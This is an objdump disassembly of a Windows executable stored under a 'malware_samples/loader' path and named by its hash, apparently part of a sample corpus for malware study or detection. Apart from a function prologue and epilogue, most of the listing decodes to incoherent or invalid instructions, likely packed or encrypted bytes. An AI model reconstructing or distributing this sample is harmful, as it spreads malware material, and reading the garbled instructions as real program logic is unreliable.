
malware_samples/loader/c03982486831a46ffda259ab72db17bf4b4511a92deebe06b867d60583e2f195.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 30             	sub    $0x30,%esp
  401006:	57                   	push   %edi
  401007:	56                   	push   %esi
  401008:	53                   	push   %ebx
  401009:	b4 b7                	mov    $0xb7,%ah
  40100b:	9e                   	sahf
  40100c:	bb 9a 97 3e 90       	mov    $0x903e979a,%ebx
  401011:	af                   	scas   %es:(%edi),%eax
  401012:	44                   	inc    %esp
  401013:	fe                   	(bad)
  401014:	a9 96 3d b7 f8       	test   $0xf8b73d96,%eax
  401019:	b3 64                	mov    $0x64,%bl
  40101b:	3e e0 25             	loopne,pt 0x401043
  40101e:	3f                   	aas
  40101f:	29 63 bd             	sub    %esp,-0x43(%ebx)
  401022:	48                   	dec    %eax
  401023:	f2 fb                	repnz sti
  401025:	e0 c9                	loopne 0x400ff0
  401027:	82 df 0e             	sbb    $0xe,%bh
  40102a:	42                   	inc    %edx
  40102b:	7e 16                	jle    0x401043
  40102d:	36 34 2c             	ss xor $0x2c,%al
  401030:	6c                   	insb   (%dx),%es:(%edi)
  401031:	d4 a3                	aam    $0xa3
  401033:	82 ab 62 68 3c 4a aa 	subb   $0xaa,0x4a3c6862(%ebx)
  40103a:	85 46 6e             	test   %eax,0x6e(%esi)
  40103d:	32 2a                	xor    (%edx),%ch
  40103f:	f8                   	clc
  401040:	2b df                	sub    %edi,%ebx
  401042:	ec                   	in     (%dx),%al
  401043:	5d                   	pop    %ebp
  401044:	83 f6 d9             	xor    $0xffffffd9,%esi
  401047:	ea 07 df 10 4c 08 34 	ljmp   $0x3408,$0x4c10df07
  40104e:	b8 5b 63 6f 81       	mov    $0x816f635b,%eax
  401053:	b8 6b 49 8b 1e       	mov    $0x1e8b496b,%eax
  401058:	50                   	push   %eax
  401059:	ac                   	lods   %ds:(%esi),%al
  40105a:	4b                   	dec    %ebx
  40105b:	af                   	scas   %es:(%edi),%eax
  40105c:	36 6e                	outsb  %ss:(%esi),(%dx)
  40105e:	82 7f 83 34          	cmpb   $0x34,-0x7d(%edi)
  401062:	00 92 ff 30 a4 c9    	add    %dl,-0x365bcf01(%edx)
  401068:	42                   	inc    %edx
  401069:	2a b2 bf 7e bc 93    	sub    -0x6c438141(%edx),%dh
  40106f:	7e d4                	jle    0x401045
  401071:	db 38                	fstpt  (%eax)
  401073:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401074:	e5 7c                	in     $0x7c,%eax
  401076:	7e 0a                	jle    0x401082
  401078:	a2 95 8a a1 38       	mov    %al,0x38a18a95
  40107d:	d0 c1                	rol    $1,%cl
  40107f:	3a d4                	cmp    %ah,%dl
  401081:	85 d8                	test   %ebx,%eax
  401083:	1b 57 f1             	sbb    -0xf(%edi),%edx
  401086:	12 cc                	adc    %ah,%cl
  401088:	1b f1                	sbb    %ecx,%esi
  40108a:	78 66                	js     0x4010f2
  40108c:	c6                   	(bad)
  40108d:	5d                   	pop    %ebp
  40108e:	5b                   	pop    %ebx
  40108f:	77 bb                	ja     0x40104c
  401091:	14 14                	adc    $0x14,%al
  401093:	74 5a                	je     0x4010ef
  401095:	60                   	pusha
  401096:	06                   	push   %es
  401097:	9e                   	sahf
  401098:	97                   	xchg   %eax,%edi
  401099:	14 10                	adc    $0x10,%al
  40109b:	9a a5 b2 e1 90 2f 95 	lcall  $0x952f,$0x90e1b2a5
  4010a2:	4e                   	dec    %esi
  4010a3:	b4 f3                	mov    $0xf3,%ah
  4010a5:	72 6c                	jb     0x401113
  4010a7:	76 4e                	jbe    0x4010f7
  4010a9:	76 46                	jbe    0x4010f1
  4010ab:	96                   	xchg   %eax,%esi
  4010ac:	07                   	pop    %es
  4010ad:	59                   	pop    %ecx
  4010ae:	01 bd 28 a4 99 f4    	add    %edi,-0xb665bd8(%ebp)
  4010b4:	41                   	inc    %ecx
  4010b5:	51                   	push   %ecx
  4010b6:	25 43 d5 02 4c       	and    $0x4c02d543,%eax
  4010bb:	fc                   	cld
  4010bc:	df c6                	ffreep %st(6)
  4010be:	05 c7 50 66 56       	add    $0x566650c7,%eax
  4010c3:	c6                   	(bad)
  4010c4:	19 bd dc 51 25 1d    	sbb    %edi,0x1d2551dc(%ebp)
  4010ca:	ab                   	stos   %eax,%es:(%edi)
  4010cb:	2c 00                	sub    $0x0,%al
  4010cd:	d8 81 3c 3a 88 5f    	fadds  0x5f883a3c(%ecx)
  4010d3:	cf                   	iret
  4010d4:	56                   	push   %esi
  4010d5:	7e f2                	jle    0x4010c9
  4010d7:	25 8b 52 06 68       	and    $0x6806528b,%eax
  4010dc:	a8 bb                	test   $0xbb,%al
  4010de:	1c 3e                	sbb    $0x3e,%al
  4010e0:	7c 56                	jl     0x401138
  4010e2:	90                   	nop
  4010e3:	07                   	pop    %es
  4010e4:	e9 5b 5e 5f 83       	jmp    0x839f6f44
  4010e9:	c4 30                	les    (%eax),%esi
  4010eb:	5d                   	pop    %ebp
  4010ec:	c3                   	ret
  4010ed:	d1 30                	shll   $1,(%eax)
  4010ef:	fc                   	cld
  4010f0:	3d f9 2e e8 4d       	cmp    $0x4de82ef9,%eax
  4010f5:	71 1d                	jno    0x401114
  4010f7:	4d                   	dec    %ebp
  4010f8:	93                   	xchg   %eax,%ebx
  4010f9:	2a 16                	sub    (%esi),%dl
  4010fb:	5a                   	pop    %edx
  4010fc:	d2 33                	shlb   %cl,(%ebx)
  4010fe:	19 b7 7c b4 87 12    	sbb    %esi,0x1287b47c(%edi)
  401104:	d2 e7                	shl    %cl,%bh
  401106:	2a 3e                	sub    (%esi),%bh
  401108:	d0 47 6d             	rolb   $1,0x6d(%edi)
  40110b:	a1 40 9a 81 f8       	mov    0xf8819a40,%eax
  401110:	e9 c0 ad 3e 44       	jmp    0x447ebed5
  401115:	ca 51 0d             	lret   $0xd51
  401118:	01 71 b7             	add    %esi,-0x49(%ecx)
  40111b:	86 83 ce 81 a6 c3    	xchg   %al,-0x3c597e32(%ebx)
  401121:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401122:	43                   	inc    %ebx
  401123:	2d 0d 67 b5 1c       	sub    $0x1cb5670d,%eax
  401128:	84 90 90 90 90 90    	test   %dl,-0x6f6f6f70(%eax)
  40112e:	90                   	nop
  40112f:	90                   	nop
  401130:	90                   	nop
  401131:	90                   	nop
  401132:	90                   	nop
  401133:	cc                   	int3
  401134:	cc                   	int3
  401135:	cc                   	int3
  401136:	cc                   	int3
	...
